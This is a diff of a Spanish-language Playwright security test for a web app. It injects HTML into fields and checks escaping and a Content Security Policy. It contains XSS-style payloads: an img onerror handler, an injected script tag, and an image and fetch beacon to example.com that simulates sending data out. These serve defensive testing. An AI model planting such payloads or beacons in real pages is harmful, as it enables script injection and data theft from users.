@@ -1,5 +1,7 @@
 """Prueba de inyección de HTML: rellena nombres, notas, campos numéricos y la foto de perfil con código HTML malicioso y
-recorre las 33 pantallas de tests/shots.py. Falla si alguna pantalla llega a ejecutar ese código (un dato mal escapado).
+recorre las 39 pantallas de tests/shots.py. Falla si alguna pantalla llega a ejecutar ese código (un dato mal escapado).
+Ese recorrido va sin la CSP (bypass_csp), para probar el escapado por sí solo; luego se prueba la CSP, la segunda barrera:
+con ella, ni un atributo on…= ni un <script> añadido se ejecutan, y no salen imágenes ni conexiones a otros sitios.
 Además comprueba que una copia de seguridad o unos datos guardados con una foto de perfil manipulada no la cargan.
 
   python3 tests/security.py dist/stratafit.html
@@ -32,11 +34,37 @@ MUT = """(P=>{const deep=o=>{if(o&&typeof o=='object')for(const k in o){const v=
  saveState()})(%s)""" % (repr(IMG), repr(PAY))
 
 
+# lo que haría un dato que llegara sin escapar: un atributo on…=, un <script> nuevo, una imagen y una conexión a otro sitio
+ATTACK = """document.body.insertAdjacentHTML('beforeend','<img src="data:," onerror="window.__y=1"><img src="https://example.com/p.png?d=1">');
+ const s=document.createElement('script');s.textContent='window.__y=2';document.body.appendChild(s);
+ fetch('https://example.com/?d=1').catch(()=>{})"""
+
+
+def csp_check(b, path):
+    """Con la CSP puesta (sin bypass): [(comprobación, correcta, detalle)]."""
+    c = b.new_context(viewport={'width': 390, 'height': 844}, **context_opts(path))
+    c.add_init_script(rd('init.js'))
+    pg = c.new_page()
+    pg.goto(app_url(path))
+    pg.wait_for_timeout(800)
+    ev = pg.evaluate
+    pol = ev("(document.querySelector('meta[http-equiv=Content-Security-Policy]')||{}).content||''")
+    clean = ev('window.__csp||[]')
+    ev(ATTACK)
+    pg.wait_for_timeout(700)
+    v = ev('window.__csp||[]')
+    out = [('la CSP está puesta y la app arranca con ella sin bloqueos', bool(pol) and ev('!!window.__ffok') and not clean, [pol[:80], clean]),
+           ('con la CSP no se ejecuta código inyectado (on…= ni <script>)', ev('window.__y') is None and len([x for x in v if x.startswith('script-src')]) >= 2, v),
+           ('con la CSP no salen imágenes ni conexiones a otros sitios', any(x.startswith('img-src') for x in v) and any(x.startswith('connect-src') for x in v), v)]
+    c.close()
+    return out
+
+
 def main(path):
     path = os.path.abspath(path)
     with sync_playwright() as p:
         b = launch(p)
-        c = b.new_context(viewport={'width': 390, 'height': 844}, **context_opts(path))
+        c = b.new_context(viewport={'width': 390, 'height': 844}, bypass_csp=True, **context_opts(path))
         c.add_init_script(rd('init.js'))
         pg = c.new_page()
         pg.on('dialog', lambda d: d.accept())
@@ -68,15 +96,25 @@ def main(path):
         restored = pg.evaluate("(img=>{const r=parseBackup(JSON.stringify(Object.assign({},S,{pf:{name:'Ana',img}})));return [r.s.pf.img===undefined,r.s.pf.name,r.fix]})(%s)" % repr(IMG))
         good = pg.evaluate("(()=>{const ok='data:image/jpeg;base64,/9j/4AAQSkZJRg==';return parseBackup(JSON.stringify(Object.assign({},S,{pf:{img:ok}}))).s.pf.img===ok})()")
         hit = sorted(set(str(x) for x in pg.evaluate('window.__x||[]')))
+        # control: en este recorrido (sin CSP) un HTML inyectado de verdad sí se ejecuta, así que la prueba lo vería
+        pg.evaluate("document.body.insertAdjacentHTML('beforeend','<img src=\"data:,\" onerror=\"window.__z=1\">')")
+        pg.clock.run_for(200)
+        pg.wait_for_timeout(300)
+        control = pg.evaluate('window.__z') == 1
+        c.close()
+        csp = csp_check(b, path)
         b.close()
     print('  pantallas recorridas:', len(SCR))
     print('  ' + ('ok    ' if not hit else 'FALLA ') + 'ninguna ejecuta HTML inyectado', hit or '')
+    print('  ' + ('ok    ' if control else 'FALLA ') + 'control: sin la CSP, un HTML inyectado sí se ejecutaría (la prueba lo detecta)')
     print('  ' + ('ok    ' if stored else 'FALLA ') + 'al arrancar se descarta una foto de perfil que no es una imagen')
     print('  ' + ('ok    ' if restored[0] and restored[1] == 'Ana' and restored[2] >= 1 else 'FALLA ') + 'una copia con la foto manipulada se restaura sin ella', '' if restored[0] else restored)
     print('  ' + ('ok    ' if good else 'FALLA ') + 'una foto de perfil de verdad sí se conserva')
+    for name, cond, info in csp:
+        print('  ' + ('ok    ' if cond else 'FALLA ') + name, '' if cond else info)
     if bad:
         print('  FALLA errores al abrir pantallas:', bad[:5])
-    ok = not hit and not bad and stored and restored[0] and restored[1] == 'Ana' and restored[2] >= 1 and good
+    ok = not hit and not bad and stored and restored[0] and restored[1] == 'Ana' and restored[2] >= 1 and good and control and all(x[1] for x in csp)
     print('\n' + ('TODO CORRECTO' if ok else 'FALLAN'))
     sys.exit(0 if ok else 1)
 
